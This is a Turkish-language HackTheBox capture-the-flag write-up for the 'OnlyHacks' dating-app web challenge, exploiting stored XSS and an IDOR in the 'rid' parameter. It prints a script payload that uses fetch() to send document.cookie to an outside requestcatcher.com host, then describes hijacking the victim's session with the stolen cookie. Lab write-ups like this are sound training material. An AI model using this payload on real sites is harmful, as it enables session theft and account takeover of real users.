---
title: 'HackTheBox Challenges | OnlyHacks WriteUp'
author: appdone
categories: [HackTheBox Challenges]
tags: [idor, xss]
render_with_liquid: false
media_subpath: /images/hackthebox_onlyhacks/
image:
  path: logo.webp
---

Bu yazımda HackTheBox platformunda yer alan “OnlyHacks” isimli meydan okumayı çözeceğim. Meydan okuma sevgililer gününe özel olarak hazırlanmış kolay seviye bir web uygulamasıdır.

![](1.webp){: width="1200" height="600" }

Kayıt olduktan sonra doğrudan eşleşmelerin yapıldığı sayfaya yönlendiriliyoruz. Gösterilen herkesi beğendikten sonra “Matches” sayfasına yöneliyoruz ve bir kişi ile eşleştiğimizi görüyoruz.

![](2.webp){: width="1200" height="600" }

Mesajlaşma alanında html etiketleri ve javascript kodları çalıştırabiliyoruz. Mesajlarımızın okunduğunu bildiğimiz için cookie bilgilerini almamızı sağlayacak bir javascript kodu yazabiliriz.

```
<script>
  fetch("https://test12345.requestcatcher.com/cookie?=" + document.cookie);
</script>
```

Cookie bilgilerini yakalamak için requestcatcher.com sitesini kullanacağım.

![](3.webp){: width="1200" height="600" }

Elde ettiğimiz cookie bilgilerini kopyalayıp devtools aracılığıyla kendimizinkiyle değiştiriyoruz. Böylece sayfayı yenilediğimizde bayrağı başka bir kişiden gelen mesaj içerisinde buluyoruz.

![](4.webp){: width="1200" height="600" }

Bunun haricinde mesajları görüntülediğimiz sayfaya rid parametresi ile yönlendirildiğimizi fark etmişsinizdir. Buradaki değeri değiştirdiğimizde aynı şekilde bayrağı görebiliyoruz.

![](5.webp){: width="1200" height="600" }

Kısaca web uygulamasında hem XSS zafiyeti hem de IDOR zafiyeti barınıyor.
